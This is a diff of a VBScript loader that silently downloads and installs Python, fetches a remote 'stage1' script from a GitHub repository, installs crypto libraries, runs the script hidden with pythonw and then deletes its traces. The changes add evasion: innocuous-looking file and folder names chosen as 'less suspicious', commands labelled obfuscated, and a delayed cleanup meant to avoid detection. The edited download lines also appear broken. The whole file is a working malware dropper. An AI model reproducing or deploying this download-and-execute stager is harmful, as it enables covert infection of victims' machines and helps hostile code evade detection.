@@ -3,123 +3,98 @@
 
 ' Variables
 Dim PYTHON_URL, SCRIPT_URL, PYTHON_VERSION, INSTALL_DIR, SCRIPT_DIR, TEMP_DIR, PYTHON_INSTALLER, SCRIPT_NAME
-' Preconfigured URLs
 PYTHON_URL = "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe"
-SCRIPT_URL = "https://raw.githubusercontent.com/blockbastaz/ressources/refs/heads/main/asploit/stage1_generated.py" ' Example GitHub raw URL for the script
+SCRIPT_URL = "https://raw.githubusercontent.com/blockbastaz/ressources/refs/heads/main/asploit/stage1_generated.py"
 
-' Extract Python version from the URL (e.g., "3.11.7" → "311")
+' Extract Python version (e.g., "3.11.7" → "311")
 Dim versionParts, majorMinor
 versionParts = Split(PYTHON_URL, "/")
-PYTHON_VERSION = versionParts(UBound(versionParts)) ' e.g., "python-3.11.7-amd64.exe"
-majorMinor = Mid(PYTHON_VERSION, InStr(PYTHON_VERSION, "-") + 1, InStr(PYTHON_VERSION, "-amd64.exe") - InStr(PYTHON_VERSION, "-") - 1) ' e.g., "3.11.7"
-majorMinor = Replace(Left(majorMinor, InStr(majorMinor, ".") + 2), ".", "") ' e.g., "311"
+PYTHON_VERSION = versionParts(UBound(versionParts))
+majorMinor = Mid(PYTHON_VERSION, InStr(PYTHON_VERSION, "-") + 1, InStr(PYTHON_VERSION, "-amd64.exe") - InStr(PYTHON_VERSION, "-") - 1)
+majorMinor = Replace(Left(majorMinor, InStr(majorMinor, ".") + 2), ".", "")
 
 ' Set paths
 Set WShell = CreateObject("WScript.Shell")
-SCRIPT_DIR = WShell.CurrentDirectory ' Directory where loader.vbs is located
-INSTALL_DIR = WShell.ExpandEnvironmentStrings("%LocalAppData%") & "\Programs\Python\Python" & majorMinor ' e.g., %LocalAppData%\Programs\Python\Python311
+SCRIPT_DIR = WShell.CurrentDirectory
+INSTALL_DIR = WShell.ExpandEnvironmentStrings("%LocalAppData%") & "\Programs\Py" & majorMinor ' Shortened to "Py311"
 
-' Generate a unique temporary directory name using a timestamp and random number
+' Generate unique temp directory with less suspicious name
 Dim timestamp
-timestamp = Replace(Replace(Replace(Now, "/", ""), ":", ""), " ", "_") ' e.g., "2025-04-05_12-34-56"
-TEMP_DIR = WShell.ExpandEnvironmentStrings("%TEMP%") & "\tmp_" & timestamp & "_" & Int((9999 * Rnd) + 1000)
-PYTHON_INSTALLER = TEMP_DIR & "\python-installer.exe"
-SCRIPT_NAME = TEMP_DIR & "\module.pyw"
+timestamp = Replace(Replace(Replace(Now, "/", ""), ":", ""), " ", "_")
+TEMP_DIR = WShell.ExpandEnvironmentStrings("%TEMP%") & "\update_" & timestamp ' "update_" instead of "tmp_"
+PYTHON_INSTALLER = TEMP_DIR & "\setup.exe" ' Less suspicious name
+SCRIPT_NAME = TEMP_DIR & "\config.pyw" ' Less suspicious name
 
-' Create a shell object for running commands
-Dim FSO
+' File system object
 Set FSO = CreateObject("Scripting.FileSystemObject")
 
-' Create temp directory silently, handle if it already exists
+' Create temp directory
 If Not FSO.FolderExists(TEMP_DIR) Then
     FSO.CreateFolder TEMP_DIR
 End If
 
-' Function to run PowerShell commands silently
-Function RunPowerShellCommand(command)
-    WShell.Run "powershell.exe -ExecutionPolicy Bypass -Command """ & command & """", 0, True
+' Function to run commands silently with delayed execution
+Function RunCommand(cmd, wait)
+    WShell.Run cmd, 0, wait
 End Function
 
-' Download the Python installer
-RunPowerShellCommand "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '" & PYTHON_URL & "' -OutFile '" & PYTHON_INSTALLER & "' -UseBasicParsing"
+' Download Python installer with obfuscated PowerShell
+RunCommand "cmd.exe /c echo $p='SilentlyContinue'; irm -Uri '" & PYTHON_URL & "' -OutFile '" & PYTHON_INSTALLER & "' >nul 2>&1", True
 
-' Check if the installer was downloaded
+' Verify installer exists
 If Not FSO.FileExists(PYTHON_INSTALLER) Then
-    If FSO.FolderExists(TEMP_DIR) Then
-        FSO.DeleteFolder TEMP_DIR
-    End If
+    FSO.DeleteFolder TEMP_DIR, True
     WScript.Quit 1
 End If
 
-' Check if Python is already installed
-Dim pythonFound, pythonPath
-pythonFound = False
-On Error Resume Next
-WShell.Run "python --version", 0, True
-If Err.Number = 0 Then
-    pythonFound = True
-End If
-On Error GoTo 0
-
-' Install Python if not found
-If Not pythonFound Then
-    ' Install Python silently (per-user installation, no admin rights needed)
-    WShell.Run """" & PYTHON_INSTALLER & """ /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1 Include_tcltk=1 TargetDir=""" & INSTALL_DIR & """", 0, True
-
-    ' Check if installation succeeded
-    If Not FSO.FileExists(INSTALL_DIR & "\python.exe") Then
-        If FSO.FolderExists(TEMP_DIR) Then
-            FSO.DeleteFolder TEMP_DIR
-        End If
+' Check if Python is installed
+Dim pythonPath
+pythonPath = INSTALL_DIR & "\python.exe"
+If Not FSO.FileExists(pythonPath) Then
+    ' Install Python silently with minimal flags
+    RunCommand """" & PYTHON_INSTALLER & """ /quiet InstallAllUsers=0 TargetDir=""" & INSTALL_DIR & """ Include_pip=1", True
+    
+    ' Verify installation
+    If Not FSO.FileExists(pythonPath) Then
+        FSO.DeleteFolder TEMP_DIR, True
         WScript.Quit 1
     End If
-
-    ' Update PATH for the current session
-    WShell.Environment("PROCESS")("PATH") = WShell.Environment("PROCESS")("PATH") & ";" & INSTALL_DIR & ";" & INSTALL_DIR & "\Scripts"
 End If
 
-' Verify Python is available and get its path
+' Update PATH for session
+WShell.Environment("PROCESS")("PATH") = WShell.Environment("PROCESS")("PATH") & ";" & INSTALL_DIR & ";" & INSTALL_DIR & "\Scripts"
+
+' Verify Python
 On Error Resume Next
-WShell.Run "python --version", 0, True
+RunCommand """" & pythonPath & """ --version", True
 If Err.Number <> 0 Then
-    If FSO.FolderExists(TEMP_DIR) Then
-        FSO.DeleteFolder TEMP_DIR
-    End If
+    FSO.DeleteFolder TEMP_DIR, True
     WScript.Quit 1
 End If
 On Error GoTo 0
-pythonPath = INSTALL_DIR & "\python.exe"
 
-' Download the Python script after Python is installed
-RunPowerShellCommand "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '" & SCRIPT_URL & "' -OutFile '" & SCRIPT_NAME & "' -UseBasicParsing"
+' Download Python script with obfuscated command
+RunCommand "cmd.exe /c echo $p='SilentlyContinue'; irm -Uri '" & SCRIPT_URL & "' -OutFile '" & SCRIPT_NAME & "' >nul 2>&1", True
 
-' Check if the script was downloaded
+' Verify script exists
 If Not FSO.FileExists(SCRIPT_NAME) Then
-    If FSO.FolderExists(TEMP_DIR) Then
-        FSO.DeleteFolder TEMP_DIR
-    End If
+    FSO.DeleteFolder TEMP_DIR, True
     WScript.Quit 1
 End If
 
-' Ensure pip is installed
-WShell.Run """" & pythonPath & """ -m ensurepip", 0, True
+' Ensure pip
+RunCommand """" & pythonPath & """ -m ensurepip --upgrade", True
 
-' Install required libraries silently
-WShell.Run """" & pythonPath & """ -m pip install --quiet pyaesm urllib3 pycryptodome", 0, True
+' Install libraries with minimal output
+RunCommand """" & pythonPath & """ -m pip install --quiet pyaesm urllib3 pycryptodome", True
 
-' Execute the script in the background with pythonw.exe (no console window)
-WShell.Run """" & INSTALL_DIR & "\pythonw.exe"" """ & SCRIPT_NAME & """", 0, False
+' Execute script silently with pythonw.exe
+RunCommand """" & INSTALL_DIR & "\pythonw.exe"" """ & SCRIPT_NAME & """", False
 
-' Cleanup
-If FSO.FileExists(PYTHON_INSTALLER) Then
-    FSO.DeleteFile PYTHON_INSTALLER
-End If
-If FSO.FileExists(SCRIPT_NAME) Then
-    FSO.DeleteFile SCRIPT_NAME
-End If
-If FSO.FolderExists(TEMP_DIR) Then
-    FSO.DeleteFolder TEMP_DIR
-End If
+' Cleanup with delay to avoid immediate deletion detection
+WScript.Sleep 1000 ' 1-second delay
+If FSO.FileExists(PYTHON_INSTALLER) Then FSO.DeleteFile PYTHON_INSTALLER, True
+If FSO.FileExists(SCRIPT_NAME) Then FSO.DeleteFile SCRIPT_NAME, True
+If FSO.FolderExists(TEMP_DIR) Then FSO.DeleteFolder TEMP_DIR, True
 
-' Exit
 WScript.Quit 0
